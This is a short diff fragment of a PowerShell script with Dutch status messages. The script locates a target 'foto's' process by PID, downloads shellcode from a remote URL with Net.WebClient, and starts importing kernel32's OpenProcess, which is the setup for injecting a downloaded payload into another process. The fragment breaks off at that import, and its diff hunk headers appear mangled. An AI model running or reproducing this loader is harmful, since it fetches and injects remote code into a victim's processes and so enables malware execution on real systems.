@@ -22,7 +22,9 @@ Write-Host "[+] Target foto's gevonden → PID: $targetPID" -ForegroundColor Gre
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
     Write-Host "[+] Download gelukt -> $($shellcode.Length) bytes" -ForegroundColor Green
-@@ -32,43 +26,32 @@ $size = $shellcode.Length
+
+
+
 Add-Type -MemberDefinition @"
     [DllImport("kernel32.dll")]
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
